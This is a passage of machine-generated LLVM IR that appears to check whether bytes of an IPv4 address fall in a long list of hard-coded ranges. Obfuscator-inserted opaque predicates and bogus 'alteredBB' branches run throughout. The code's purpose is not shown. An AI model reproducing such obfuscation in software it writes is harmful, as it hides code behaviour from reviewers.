  %3136 = load i8, i8* %4, align 1
  %3137 = zext i8 %3136 to i32
  %3138 = icmp sge i32 %3137, 136
  %3139 = load i32, i32* @x.57
  %3140 = load i32, i32* @y.58
  %3141 = sub i32 %3139, 1
  %3142 = mul i32 %3139, %3141
  %3143 = urem i32 %3142, 2
  %3144 = icmp eq i32 %3143, 0
  %3145 = icmp slt i32 %3140, 10
  %3146 = or i1 %3144, %3145
  br i1 %3146, label %originalBBpart2420, label %originalBB418alteredBB

originalBBpart2420:                               ; preds = %originalBB418
  br i1 %3138, label %3147, label %3167

; <label>:3147:                                   ; preds = %originalBBpart2420
  %3148 = load i32, i32* @x.57
  %3149 = load i32, i32* @y.58
  %3150 = sub i32 %3148, 1
  %3151 = mul i32 %3148, %3150
  %3152 = urem i32 %3151, 2
  %3153 = icmp eq i32 %3152, 0
  %3154 = icmp slt i32 %3149, 10
  %3155 = or i1 %3153, %3154
  br i1 %3155, label %originalBB422, label %originalBB422alteredBB

originalBB422:                                    ; preds = %originalBB422alteredBB, %3147
  %3156 = load i8, i8* %4, align 1
  %3157 = zext i8 %3156 to i32
  %3158 = icmp slt i32 %3157, 139
  %3159 = load i32, i32* @x.57
  %3160 = load i32, i32* @y.58
  %3161 = sub i32 %3159, 1
  %3162 = mul i32 %3159, %3161
  %3163 = urem i32 %3162, 2
  %3164 = icmp eq i32 %3163, 0
  %3165 = icmp slt i32 %3160, 10
  %3166 = or i1 %3164, %3165
  br i1 %3166, label %originalBBpart2424, label %originalBB422alteredBB

originalBBpart2424:                               ; preds = %originalBB422
  br i1 %3158, label %5259, label %3167

; <label>:3167:                                   ; preds = %originalBBpart2424, %originalBBpart2420, %3123, %originalBBpart2416
  %3168 = load i8, i8* %2, align 1
  %3169 = zext i8 %3168 to i32
  %3170 = icmp eq i32 %3169, 185
  br i1 %3170, label %3171, label %3199

; <label>:3171:                                   ; preds = %3167
  %3172 = load i32, i32* @x.57
  %3173 = load i32, i32* @y.58
  %3174 = sub i32 %3172, 1
  %3175 = mul i32 %3172, %3174
  %3176 = urem i32 %3175, 2
  %3177 = icmp eq i32 %3176, 0
  %3178 = icmp slt i32 %3173, 10
  %3179 = or i1 %3177, %3178
  br i1 %3179, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %3171
  %3180 = load i8, i8* %3, align 1
  %3181 = zext i8 %3180 to i32
  %3182 = icmp eq i32 %3181, 62
  %3183 = load i32, i32* @x.57
  %3184 = load i32, i32* @y.58
  %3185 = sub i32 %3183, 1
  %3186 = mul i32 %3183, %3185
  %3187 = urem i32 %3186, 2
  %3188 = icmp eq i32 %3187, 0
  %3189 = icmp slt i32 %3184, 10
  %3190 = or i1 %3188, %3189
  br i1 %3190, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %3182, label %3191, label %3199

; <label>:3191:                                   ; preds = %originalBBpart2428
  %3192 = load i8, i8* %4, align 1
  %3193 = zext i8 %3192 to i32
  %3194 = icmp sge i32 %3193, 187
  br i1 %3194, label %3195, label %3199

; <label>:3195:                                   ; preds = %3191
  %3196 = load i8, i8* %4, align 1
  %3197 = zext i8 %3196 to i32
  %3198 = icmp slt i32 %3197, 191
  br i1 %3198, label %5259, label %3199

; <label>:3199:                                   ; preds = %3195, %3191, %originalBBpart2428, %3167
  %3200 = load i32, i32* @x.57
  %3201 = load i32, i32* @y.58
  %3202 = sub i32 %3200, 1
  %3203 = mul i32 %3200, %3202
  %3204 = urem i32 %3203, 2
  %3205 = icmp eq i32 %3204, 0
  %3206 = icmp slt i32 %3201, 10
  %3207 = or i1 %3205, %3206
  br i1 %3207, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %3199
  %3208 = load i8, i8* %2, align 1
  %3209 = zext i8 %3208 to i32
  %3210 = icmp eq i32 %3209, 66
  %3211 = load i32, i32* @x.57
  %3212 = load i32, i32* @y.58
  %3213 = sub i32 %3211, 1
  %3214 = mul i32 %3211, %3213
  %3215 = urem i32 %3214, 2
  %3216 = icmp eq i32 %3215, 0
  %3217 = icmp slt i32 %3212, 10
  %3218 = or i1 %3216, %3217
  br i1 %3218, label %originalBBpart2432, label %originalBB430alteredBB

originalBBpart2432:                               ; preds = %originalBB430
  br i1 %3210, label %3219, label %3231

; <label>:3219:                                   ; preds = %originalBBpart2432
  %3220 = load i8, i8* %3, align 1
  %3221 = zext i8 %3220 to i32
  %3222 = icmp eq i32 %3221, 150
  br i1 %3222, label %3223, label %3231

; <label>:3223:                                   ; preds = %3219
  %3224 = load i8, i8* %4, align 1
  %3225 = zext i8 %3224 to i32
  %3226 = icmp sge i32 %3225, 120
  br i1 %3226, label %3227, label %3231

; <label>:3227:                                   ; preds = %3223
  %3228 = load i8, i8* %4, align 1
  %3229 = zext i8 %3228 to i32
  %3230 = icmp slt i32 %3229, 215
  br i1 %3230, label %5259, label %3231

; <label>:3231:                                   ; preds = %3227, %3223, %3219, %originalBBpart2432
  %3232 = load i8, i8* %2, align 1
  %3233 = zext i8 %3232 to i32
  %3234 = icmp eq i32 %3233, 66
  br i1 %3234, label %3235, label %3247

; <label>:3235:                                   ; preds = %3231
  %3236 = load i8, i8* %3, align 1
  %3237 = zext i8 %3236 to i32
  %3238 = icmp eq i32 %3237, 151
  br i1 %3238, label %3239, label %3247

; <label>:3239:                                   ; preds = %3235
  %3240 = load i8, i8* %4, align 1
  %3241 = zext i8 %3240 to i32
  %3242 = icmp sge i32 %3241, 137
  br i1 %3242, label %3243, label %3247

; <label>:3243:                                   ; preds = %3239
  %3244 = load i8, i8* %4, align 1
  %3245 = zext i8 %3244 to i32
  %3246 = icmp slt i32 %3245, 139
  br i1 %3246, label %5259, label %3247

; <label>:3247:                                   ; preds = %3243, %3239, %3235, %3231
  %3248 = load i8, i8* %2, align 1
  %3249 = zext i8 %3248 to i32
  %3250 = icmp eq i32 %3249, 64
  br i1 %3250, label %3251, label %3263

; <label>:3251:                                   ; preds = %3247
  %3252 = load i8, i8* %3, align 1
  %3253 = zext i8 %3252 to i32
  %3254 = icmp eq i32 %3253, 94
  br i1 %3254, label %3255, label %3263

; <label>:3255:                                   ; preds = %3251
  %3256 = load i8, i8* %4, align 1
  %3257 = zext i8 %3256 to i32
  %3258 = icmp sge i32 %3257, 237
  br i1 %3258, label %3259, label %3263

; <label>:3259:                                   ; preds = %3255
  %3260 = load i8, i8* %4, align 1
  %3261 = zext i8 %3260 to i32
  %3262 = icmp slt i32 %3261, 255
  br i1 %3262, label %5259, label %3263

; <label>:3263:                                   ; preds = %3259, %3255, %3251, %3247
  %3264 = load i8, i8* %2, align 1
  %3265 = zext i8 %3264 to i32
  %3266 = icmp eq i32 %3265, 63
  br i1 %3266, label %3267, label %3311

; <label>:3267:                                   ; preds = %3263
  %3268 = load i32, i32* @x.57
  %3269 = load i32, i32* @y.58
  %3270 = sub i32 %3268, 1
  %3271 = mul i32 %3268, %3270
  %3272 = urem i32 %3271, 2
  %3273 = icmp eq i32 %3272, 0
  %3274 = icmp slt i32 %3269, 10
  %3275 = or i1 %3273, %3274
  br i1 %3275, label %originalBB434, label %originalBB434alteredBB

originalBB434:                                    ; preds = %originalBB434alteredBB, %3267
  %3276 = load i8, i8* %3, align 1
  %3277 = zext i8 %3276 to i32
  %3278 = icmp eq i32 %3277, 251
  %3279 = load i32, i32* @x.57
  %3280 = load i32, i32* @y.58
  %3281 = sub i32 %3279, 1
  %3282 = mul i32 %3279, %3281
  %3283 = urem i32 %3282, 2
  %3284 = icmp eq i32 %3283, 0
  %3285 = icmp slt i32 %3280, 10
  %3286 = or i1 %3284, %3285
  br i1 %3286, label %originalBBpart2436, label %originalBB434alteredBB

originalBBpart2436:                               ; preds = %originalBB434
  br i1 %3278, label %3287, label %3311

; <label>:3287:                                   ; preds = %originalBBpart2436
  %3288 = load i32, i32* @x.57
  %3289 = load i32, i32* @y.58
  %3290 = sub i32 %3288, 1
  %3291 = mul i32 %3288, %3290
  %3292 = urem i32 %3291, 2
  %3293 = icmp eq i32 %3292, 0
  %3294 = icmp slt i32 %3289, 10
  %3295 = or i1 %3293, %3294
  br i1 %3295, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %3287
  %3296 = load i8, i8* %4, align 1
  %3297 = zext i8 %3296 to i32
  %3298 = icmp sge i32 %3297, 19
  %3299 = load i32, i32* @x.57
  %3300 = load i32, i32* @y.58
  %3301 = sub i32 %3299, 1
  %3302 = mul i32 %3299, %3301
  %3303 = urem i32 %3302, 2
  %3304 = icmp eq i32 %3303, 0
  %3305 = icmp slt i32 %3300, 10
  %3306 = or i1 %3304, %3305
  br i1 %3306, label %originalBBpart2440, label %originalBB438alteredBB

originalBBpart2440:                               ; preds = %originalBB438
  br i1 %3298, label %3307, label %3311

; <label>:3307:                                   ; preds = %originalBBpart2440
  %3308 = load i8, i8* %4, align 1
  %3309 = zext i8 %3308 to i32
  %3310 = icmp slt i32 %3309, 21
  br i1 %3310, label %5259, label %3311

; <label>:3311:                                   ; preds = %3307, %originalBBpart2440, %originalBBpart2436, %3263
  %3312 = load i8, i8* %2, align 1
  %3313 = zext i8 %3312 to i32
  %3314 = icmp eq i32 %3313, 70
  br i1 %3314, label %3315, label %3359

; <label>:3315:                                   ; preds = %3311
  %3316 = load i8, i8* %3, align 1
  %3317 = zext i8 %3316 to i32
  %3318 = icmp eq i32 %3317, 42
  br i1 %3318, label %3319, label %3359

; <label>:3319:                                   ; preds = %3315
  %3320 = load i32, i32* @x.57
  %3321 = load i32, i32* @y.58
  %3322 = sub i32 %3320, 1
  %3323 = mul i32 %3320, %3322
  %3324 = urem i32 %3323, 2
  %3325 = icmp eq i32 %3324, 0
  %3326 = icmp slt i32 %3321, 10
  %3327 = or i1 %3325, %3326
  br i1 %3327, label %originalBB442, label %originalBB442alteredBB

originalBB442:                                    ; preds = %originalBB442alteredBB, %3319
  %3328 = load i8, i8* %4, align 1
  %3329 = zext i8 %3328 to i32
  %3330 = icmp sge i32 %3329, 73
  %3331 = load i32, i32* @x.57
  %3332 = load i32, i32* @y.58
  %3333 = sub i32 %3331, 1
  %3334 = mul i32 %3331, %3333
  %3335 = urem i32 %3334, 2
  %3336 = icmp eq i32 %3335, 0
  %3337 = icmp slt i32 %3332, 10
  %3338 = or i1 %3336, %3337
  br i1 %3338, label %originalBBpart2444, label %originalBB442alteredBB

originalBBpart2444:                               ; preds = %originalBB442
  br i1 %3330, label %3339, label %3359

; <label>:3339:                                   ; preds = %originalBBpart2444
  %3340 = load i32, i32* @x.57
  %3341 = load i32, i32* @y.58
  %3342 = sub i32 %3340, 1
  %3343 = mul i32 %3340, %3342
  %3344 = urem i32 %3343, 2
  %3345 = icmp eq i32 %3344, 0
  %3346 = icmp slt i32 %3341, 10
  %3347 = or i1 %3345, %3346
  br i1 %3347, label %originalBB446, label %originalBB446alteredBB

originalBB446:                                    ; preds = %originalBB446alteredBB, %3339
  %3348 = load i8, i8* %4, align 1
  %3349 = zext i8 %3348 to i32
  %3350 = icmp slt i32 %3349, 75
  %3351 = load i32, i32* @x.57
  %3352 = load i32, i32* @y.58
  %3353 = sub i32 %3351, 1
  %3354 = mul i32 %3351, %3353
  %3355 = urem i32 %3354, 2
  %3356 = icmp eq i32 %3355, 0
  %3357 = icmp slt i32 %3352, 10
  %3358 = or i1 %3356, %3357
  br i1 %3358, label %originalBBpart2448, label %originalBB446alteredBB

originalBBpart2448:                               ; preds = %originalBB446
  br i1 %3350, label %5259, label %3359

; <label>:3359:                                   ; preds = %originalBBpart2448, %originalBBpart2444, %3315, %3311
  %3360 = load i32, i32* @x.57
  %3361 = load i32, i32* @y.58
  %3362 = sub i32 %3360, 1
  %3363 = mul i32 %3360, %3362
  %3364 = urem i32 %3363, 2
  %3365 = icmp eq i32 %3364, 0
  %3366 = icmp slt i32 %3361, 10
  %3367 = or i1 %3365, %3366
  br i1 %3367, label %originalBB450, label %originalBB450alteredBB

originalBB450:                                    ; preds = %originalBB450alteredBB, %3359
  %3368 = load i8, i8* %2, align 1
  %3369 = zext i8 %3368 to i32
  %3370 = icmp eq i32 %3369, 74
  %3371 = load i32, i32* @x.57
  %3372 = load i32, i32* @y.58
  %3373 = sub i32 %3371, 1
  %3374 = mul i32 %3371, %3373
  %3375 = urem i32 %3374, 2
  %3376 = icmp eq i32 %3375, 0
  %3377 = icmp slt i32 %3372, 10
  %3378 = or i1 %3376, %3377
  br i1 %3378, label %originalBBpart2452, label %originalBB450alteredBB

originalBBpart2452:                               ; preds = %originalBB450
  br i1 %3370, label %3379, label %3423

; <label>:3379:                                   ; preds = %originalBBpart2452
  %3380 = load i32, i32* @x.57
  %3381 = load i32, i32* @y.58
  %3382 = sub i32 %3380, 1
  %3383 = mul i32 %3380, %3382
  %3384 = urem i32 %3383, 2
  %3385 = icmp eq i32 %3384, 0
  %3386 = icmp slt i32 %3381, 10
  %3387 = or i1 %3385, %3386
  br i1 %3387, label %originalBB454, label %originalBB454alteredBB

originalBB454:                                    ; preds = %originalBB454alteredBB, %3379
  %3388 = load i8, i8* %3, align 1
  %3389 = zext i8 %3388 to i32
  %3390 = icmp eq i32 %3389, 91
  %3391 = load i32, i32* @x.57
  %3392 = load i32, i32* @y.58
  %3393 = sub i32 %3391, 1
  %3394 = mul i32 %3391, %3393
  %3395 = urem i32 %3394, 2
  %3396 = icmp eq i32 %3395, 0
  %3397 = icmp slt i32 %3392, 10
  %3398 = or i1 %3396, %3397
  br i1 %3398, label %originalBBpart2456, label %originalBB454alteredBB

originalBBpart2456:                               ; preds = %originalBB454
  br i1 %3390, label %3399, label %3423

; <label>:3399:                                   ; preds = %originalBBpart2456
  %3400 = load i32, i32* @x.57
  %3401 = load i32, i32* @y.58
  %3402 = sub i32 %3400, 1
  %3403 = mul i32 %3400, %3402
  %3404 = urem i32 %3403, 2
  %3405 = icmp eq i32 %3404, 0
  %3406 = icmp slt i32 %3401, 10
  %3407 = or i1 %3405, %3406
  br i1 %3407, label %originalBB458, label %originalBB458alteredBB

originalBB458:                                    ; preds = %originalBB458alteredBB, %3399
  %3408 = load i8, i8* %4, align 1
  %3409 = zext i8 %3408 to i32
  %3410 = icmp sge i32 %3409, 113
  %3411 = load i32, i32* @x.57
  %3412 = load i32, i32* @y.58
  %3413 = sub i32 %3411, 1
  %3414 = mul i32 %3411, %3413
  %3415 = urem i32 %3414, 2
  %3416 = icmp eq i32 %3415, 0
  %3417 = icmp slt i32 %3412, 10
  %3418 = or i1 %3416, %3417
  br i1 %3418, label %originalBBpart2460, label %originalBB458alteredBB

originalBBpart2460:                               ; preds = %originalBB458
  br i1 %3410, label %3419, label %3423

; <label>:3419:                                   ; preds = %originalBBpart2460
  %3420 = load i8, i8* %4, align 1
  %3421 = zext i8 %3420 to i32
  %3422 = icmp slt i32 %3421, 115
  br i1 %3422, label %5259, label %3423

; <label>:3423:                                   ; preds = %3419, %originalBBpart2460, %originalBBpart2456, %originalBBpart2452
  %3424 = load i32, i32* @x.57
  %3425 = load i32, i32* @y.58
  %3426 = sub i32 %3424, 1
  %3427 = mul i32 %3424, %3426
  %3428 = urem i32 %3427, 2
  %3429 = icmp eq i32 %3428, 0
  %3430 = icmp slt i32 %3425, 10
  %3431 = or i1 %3429, %3430
  br i1 %3431, label %originalBB462, label %originalBB462alteredBB

originalBB462:                                    ; preds = %originalBB462alteredBB, %3423
  %3432 = load i8, i8* %2, align 1
  %3433 = zext i8 %3432 to i32
  %3434 = icmp eq i32 %3433, 74
  %3435 = load i32, i32* @x.57
  %3436 = load i32, i32* @y.58
  %3437 = sub i32 %3435, 1
  %3438 = mul i32 %3435, %3437
  %3439 = urem i32 %3438, 2
  %3440 = icmp eq i32 %3439, 0
  %3441 = icmp slt i32 %3436, 10
  %3442 = or i1 %3440, %3441
  br i1 %3442, label %originalBBpart2464, label %originalBB462alteredBB

originalBBpart2464:                               ; preds = %originalBB462
  br i1 %3434, label %3443, label %3471

; <label>:3443:                                   ; preds = %originalBBpart2464
  %3444 = load i8, i8* %3, align 1
  %3445 = zext i8 %3444 to i32
  %3446 = icmp eq i32 %3445, 201
  br i1 %3446, label %3447, label %3471

; <label>:3447:                                   ; preds = %3443
  %3448 = load i32, i32* @x.57
  %3449 = load i32, i32* @y.58
  %3450 = sub i32 %3448, 1
  %3451 = mul i32 %3448, %3450
  %3452 = urem i32 %3451, 2
  %3453 = icmp eq i32 %3452, 0
  %3454 = icmp slt i32 %3449, 10
  %3455 = or i1 %3453, %3454
  br i1 %3455, label %originalBB466, label %originalBB466alteredBB

originalBB466:                                    ; preds = %originalBB466alteredBB, %3447
  %3456 = load i8, i8* %4, align 1
  %3457 = zext i8 %3456 to i32
  %3458 = icmp sge i32 %3457, 56
  %3459 = load i32, i32* @x.57
  %3460 = load i32, i32* @y.58
  %3461 = sub i32 %3459, 1
  %3462 = mul i32 %3459, %3461
  %3463 = urem i32 %3462, 2
  %3464 = icmp eq i32 %3463, 0
  %3465 = icmp slt i32 %3460, 10
  %3466 = or i1 %3464, %3465
  br i1 %3466, label %originalBBpart2468, label %originalBB466alteredBB

originalBBpart2468:                               ; preds = %originalBB466
  br i1 %3458, label %3467, label %3471

; <label>:3467:                                   ; preds = %originalBBpart2468
  %3468 = load i8, i8* %4, align 1
  %3469 = zext i8 %3468 to i32
  %3470 = icmp slt i32 %3469, 58
  br i1 %3470, label %5259, label %3471

; <label>:3471:                                   ; preds = %3467, %originalBBpart2468, %3443, %originalBBpart2464
  %3472 = load i8, i8* %2, align 1
  %3473 = zext i8 %3472 to i32
  %3474 = icmp eq i32 %3473, 188
  br i1 %3474, label %3475, label %3487

; <label>:3475:                                   ; preds = %3471
  %3476 = load i8, i8* %3, align 1
  %3477 = zext i8 %3476 to i32
  %3478 = icmp eq i32 %3477, 209
  br i1 %3478, label %3479, label %3487

; <label>:3479:                                   ; preds = %3475
  %3480 = load i8, i8* %4, align 1
  %3481 = zext i8 %3480 to i32
  %3482 = icmp sge i32 %3481, 48
  br i1 %3482, label %3483, label %3487

; <label>:3483:                                   ; preds = %3479
  %3484 = load i8, i8* %4, align 1
  %3485 = zext i8 %3484 to i32
  %3486 = icmp slt i32 %3485, 53
  br i1 %3486, label %5259, label %3487

; <label>:3487:                                   ; preds = %3483, %3479, %3475, %3471
  %3488 = load i8, i8* %2, align 1
  %3489 = zext i8 %3488 to i32
  %3490 = icmp eq i32 %3489, 188
  br i1 %3490, label %3491, label %3495

; <label>:3491:                                   ; preds = %3487
  %3492 = load i8, i8* %3, align 1
  %3493 = zext i8 %3492 to i32
  %3494 = icmp eq i32 %3493, 165
  br i1 %3494, label %5259, label %3495

; <label>:3495:                                   ; preds = %3491, %3487
  %3496 = load i8, i8* %2, align 1
  %3497 = zext i8 %3496 to i32
  %3498 = icmp eq i32 %3497, 149
  br i1 %3498, label %3499, label %3519

; <label>:3499:                                   ; preds = %3495
  %3500 = load i32, i32* @x.57
  %3501 = load i32, i32* @y.58
  %3502 = sub i32 %3500, 1
  %3503 = mul i32 %3500, %3502
  %3504 = urem i32 %3503, 2
  %3505 = icmp eq i32 %3504, 0
  %3506 = icmp slt i32 %3501, 10
  %3507 = or i1 %3505, %3506
  br i1 %3507, label %originalBB470, label %originalBB470alteredBB

originalBB470:                                    ; preds = %originalBB470alteredBB, %3499
  %3508 = load i8, i8* %3, align 1
  %3509 = zext i8 %3508 to i32
  %3510 = icmp eq i32 %3509, 202
  %3511 = load i32, i32* @x.57
  %3512 = load i32, i32* @y.58
  %3513 = sub i32 %3511, 1
  %3514 = mul i32 %3511, %3513
  %3515 = urem i32 %3514, 2
  %3516 = icmp eq i32 %3515, 0
  %3517 = icmp slt i32 %3512, 10
  %3518 = or i1 %3516, %3517
  br i1 %3518, label %originalBBpart2472, label %originalBB470alteredBB

originalBBpart2472:                               ; preds = %originalBB470
  br i1 %3510, label %5259, label %3519

; <label>:3519:                                   ; preds = %originalBBpart2472, %3495
  %3520 = load i32, i32* @x.57
  %3521 = load i32, i32* @y.58
  %3522 = sub i32 %3520, 1
  %3523 = mul i32 %3520, %3522
  %3524 = urem i32 %3523, 2
  %3525 = icmp eq i32 %3524, 0
  %3526 = icmp slt i32 %3521, 10
  %3527 = or i1 %3525, %3526
  br i1 %3527, label %originalBB474, label %originalBB474alteredBB

originalBB474:                                    ; preds = %originalBB474alteredBB, %3519
  %3528 = load i8, i8* %2, align 1
  %3529 = zext i8 %3528 to i32
  %3530 = icmp eq i32 %3529, 151
  %3531 = load i32, i32* @x.57
  %3532 = load i32, i32* @y.58
  %3533 = sub i32 %3531, 1
  %3534 = mul i32 %3531, %3533
  %3535 = urem i32 %3534, 2
  %3536 = icmp eq i32 %3535, 0
  %3537 = icmp slt i32 %3532, 10
  %3538 = or i1 %3536, %3537
  br i1 %3538, label %originalBBpart2476, label %originalBB474alteredBB

originalBBpart2476:                               ; preds = %originalBB474
  br i1 %3530, label %3539, label %3559

; <label>:3539:                                   ; preds = %originalBBpart2476
  %3540 = load i32, i32* @x.57
  %3541 = load i32, i32* @y.58
  %3542 = sub i32 %3540, 1
  %3543 = mul i32 %3540, %3542
  %3544 = urem i32 %3543, 2
  %3545 = icmp eq i32 %3544, 0
  %3546 = icmp slt i32 %3541, 10
  %3547 = or i1 %3545, %3546
  br i1 %3547, label %originalBB478, label %originalBB478alteredBB

originalBB478:                                    ; preds = %originalBB478alteredBB, %3539
  %3548 = load i8, i8* %3, align 1
  %3549 = zext i8 %3548 to i32
  %3550 = icmp eq i32 %3549, 80
  %3551 = load i32, i32* @x.57
  %3552 = load i32, i32* @y.58
  %3553 = sub i32 %3551, 1
  %3554 = mul i32 %3551, %3553
  %3555 = urem i32 %3554, 2
  %3556 = icmp eq i32 %3555, 0
  %3557 = icmp slt i32 %3552, 10
  %3558 = or i1 %3556, %3557
  br i1 %3558, label %originalBBpart2480, label %originalBB478alteredBB

originalBBpart2480:                               ; preds = %originalBB478
  br i1 %3550, label %5259, label %3559

; <label>:3559:                                   ; preds = %originalBBpart2480, %originalBBpart2476
  %3560 = load i32, i32* @x.57
  %3561 = load i32, i32* @y.58
  %3562 = sub i32 %3560, 1
  %3563 = mul i32 %3560, %3562
  %3564 = urem i32 %3563, 2
  %3565 = icmp eq i32 %3564, 0
  %3566 = icmp slt i32 %3561, 10
  %3567 = or i1 %3565, %3566
  br i1 %3567, label %originalBB482, label %originalBB482alteredBB

originalBB482:                                    ; preds = %originalBB482alteredBB, %3559
  %3568 = load i8, i8* %2, align 1
  %3569 = zext i8 %3568 to i32
  %3570 = icmp eq i32 %3569, 164
  %3571 = load i32, i32* @x.57
  %3572 = load i32, i32* @y.58
  %3573 = sub i32 %3571, 1
  %3574 = mul i32 %3571, %3573
  %3575 = urem i32 %3574, 2
  %3576 = icmp eq i32 %3575, 0
  %3577 = icmp slt i32 %3572, 10
  %3578 = or i1 %3576, %3577
  br i1 %3578, label %originalBBpart2484, label %originalBB482alteredBB

originalBBpart2484:                               ; preds = %originalBB482
  br i1 %3570, label %3579, label %3583

; <label>:3579:                                   ; preds = %originalBBpart2484
  %3580 = load i8, i8* %3, align 1
  %3581 = zext i8 %3580 to i32
  %3582 = icmp eq i32 %3581, 132
  br i1 %3582, label %5259, label %3583

; <label>:3583:                                   ; preds = %3579, %originalBBpart2484
  %3584 = load i8, i8* %2, align 1
  %3585 = zext i8 %3584 to i32
  %3586 = icmp eq i32 %3585, 176
  br i1 %3586, label %3587, label %3591

; <label>:3587:                                   ; preds = %3583
  %3588 = load i8, i8* %3, align 1
  %3589 = zext i8 %3588 to i32
  %3590 = icmp eq i32 %3589, 31
  br i1 %3590, label %5259, label %3591

; <label>:3591:                                   ; preds = %3587, %3583
  %3592 = load i8, i8* %2, align 1
  %3593 = zext i8 %3592 to i32
  %3594 = icmp eq i32 %3593, 167
  br i1 %3594, label %3595, label %3599

; <label>:3595:                                   ; preds = %3591
  %3596 = load i8, i8* %3, align 1
  %3597 = zext i8 %3596 to i32
  %3598 = icmp eq i32 %3597, 114
  br i1 %3598, label %5259, label %3599

; <label>:3599:                                   ; preds = %3595, %3591
  %3600 = load i8, i8* %2, align 1
  %3601 = zext i8 %3600 to i32
  %3602 = icmp eq i32 %3601, 178
  br i1 %3602, label %3603, label %3623

; <label>:3603:                                   ; preds = %3599
  %3604 = load i32, i32* @x.57
  %3605 = load i32, i32* @y.58
  %3606 = sub i32 %3604, 1
  %3607 = mul i32 %3604, %3606
  %3608 = urem i32 %3607, 2
  %3609 = icmp eq i32 %3608, 0
  %3610 = icmp slt i32 %3605, 10
  %3611 = or i1 %3609, %3610
  br i1 %3611, label %originalBB486, label %originalBB486alteredBB

originalBB486:                                    ; preds = %originalBB486alteredBB, %3603
  %3612 = load i8, i8* %3, align 1
  %3613 = zext i8 %3612 to i32
  %3614 = icmp eq i32 %3613, 32
  %3615 = load i32, i32* @x.57
  %3616 = load i32, i32* @y.58
  %3617 = sub i32 %3615, 1
  %3618 = mul i32 %3615, %3617
  %3619 = urem i32 %3618, 2
  %3620 = icmp eq i32 %3619, 0
  %3621 = icmp slt i32 %3616, 10
  %3622 = or i1 %3620, %3621
  br i1 %3622, label %originalBBpart2488, label %originalBB486alteredBB

originalBBpart2488:                               ; preds = %originalBB486
  br i1 %3614, label %5259, label %3623

; <label>:3623:                                   ; preds = %originalBBpart2488, %3599
  %3624 = load i8, i8* %2, align 1
  %3625 = zext i8 %3624 to i32
  %3626 = icmp eq i32 %3625, 178
  br i1 %3626, label %3627, label %3631

; <label>:3627:                                   ; preds = %3623
  %3628 = load i8, i8* %3, align 1
  %3629 = zext i8 %3628 to i32
  %3630 = icmp eq i32 %3629, 33
  br i1 %3630, label %5259, label %3631

; <label>:3631:                                   ; preds = %3627, %3623
  %3632 = load i8, i8* %2, align 1
  %3633 = zext i8 %3632 to i32
  %3634 = icmp eq i32 %3633, 37
  br i1 %3634, label %3635, label %3639

; <label>:3635:                                   ; preds = %3631
  %3636 = load i8, i8* %3, align 1
  %3637 = zext i8 %3636 to i32
  %3638 = icmp eq i32 %3637, 59
  br i1 %3638, label %5259, label %3639

; <label>:3639:                                   ; preds = %3635, %3631
  %3640 = load i8, i8* %2, align 1
  %3641 = zext i8 %3640 to i32
  %3642 = icmp eq i32 %3641, 37
  br i1 %3642, label %3643, label %3647

; <label>:3643:                                   ; preds = %3639
  %3644 = load i8, i8* %3, align 1
  %3645 = zext i8 %3644 to i32
  %3646 = icmp eq i32 %3645, 187
  br i1 %3646, label %5259, label %3647

; <label>:3647:                                   ; preds = %3643, %3639
  %3648 = load i8, i8* %2, align 1
  %3649 = zext i8 %3648 to i32
  %3650 = icmp eq i32 %3649, 46
  br i1 %3650, label %3651, label %3671

; <label>:3651:                                   ; preds = %3647
  %3652 = load i32, i32* @x.57
  %3653 = load i32, i32* @y.58
  %3654 = sub i32 %3652, 1
  %3655 = mul i32 %3652, %3654
  %3656 = urem i32 %3655, 2
  %3657 = icmp eq i32 %3656, 0
  %3658 = icmp slt i32 %3653, 10
  %3659 = or i1 %3657, %3658
  br i1 %3659, label %originalBB490, label %originalBB490alteredBB

originalBB490:                                    ; preds = %originalBB490alteredBB, %3651
  %3660 = load i8, i8* %3, align 1
  %3661 = zext i8 %3660 to i32
  %3662 = icmp eq i32 %3661, 105
  %3663 = load i32, i32* @x.57
  %3664 = load i32, i32* @y.58
  %3665 = sub i32 %3663, 1
  %3666 = mul i32 %3663, %3665
  %3667 = urem i32 %3666, 2
  %3668 = icmp eq i32 %3667, 0
  %3669 = icmp slt i32 %3664, 10
  %3670 = or i1 %3668, %3669
  br i1 %3670, label %originalBBpart2492, label %originalBB490alteredBB

originalBBpart2492:                               ; preds = %originalBB490
  br i1 %3662, label %5259, label %3671

; <label>:3671:                                   ; preds = %originalBBpart2492, %3647
  %3672 = load i32, i32* @x.57
  %3673 = load i32, i32* @y.58
  %3674 = sub i32 %3672, 1
  %3675 = mul i32 %3672, %3674
  %3676 = urem i32 %3675, 2
  %3677 = icmp eq i32 %3676, 0
  %3678 = icmp slt i32 %3673, 10
  %3679 = or i1 %3677, %3678
  br i1 %3679, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3671
  %3680 = load i8, i8* %2, align 1
  %3681 = zext i8 %3680 to i32
  %3682 = icmp eq i32 %3681, 51
  %3683 = load i32, i32* @x.57
  %3684 = load i32, i32* @y.58
  %3685 = sub i32 %3683, 1
  %3686 = mul i32 %3683, %3685
  %3687 = urem i32 %3686, 2
  %3688 = icmp eq i32 %3687, 0
  %3689 = icmp slt i32 %3684, 10
  %3690 = or i1 %3688, %3689
  br i1 %3690, label %originalBBpart2496, label %originalBB494alteredBB

originalBBpart2496:                               ; preds = %originalBB494
  br i1 %3682, label %3691, label %3695

; <label>:3691:                                   ; preds = %originalBBpart2496
  %3692 = load i8, i8* %3, align 1
  %3693 = zext i8 %3692 to i32
  %3694 = icmp eq i32 %3693, 254
  br i1 %3694, label %5259, label %3695

; <label>:3695:                                   ; preds = %3691, %originalBBpart2496
  %3696 = load i32, i32* @x.57
  %3697 = load i32, i32* @y.58
  %3698 = sub i32 %3696, 1
  %3699 = mul i32 %3696, %3698
  %3700 = urem i32 %3699, 2
  %3701 = icmp eq i32 %3700, 0
  %3702 = icmp slt i32 %3697, 10
  %3703 = or i1 %3701, %3702
  br i1 %3703, label %originalBB498, label %originalBB498alteredBB

originalBB498:                                    ; preds = %originalBB498alteredBB, %3695
  %3704 = load i8, i8* %2, align 1
  %3705 = zext i8 %3704 to i32
  %3706 = icmp eq i32 %3705, 51
  %3707 = load i32, i32* @x.57
  %3708 = load i32, i32* @y.58
  %3709 = sub i32 %3707, 1
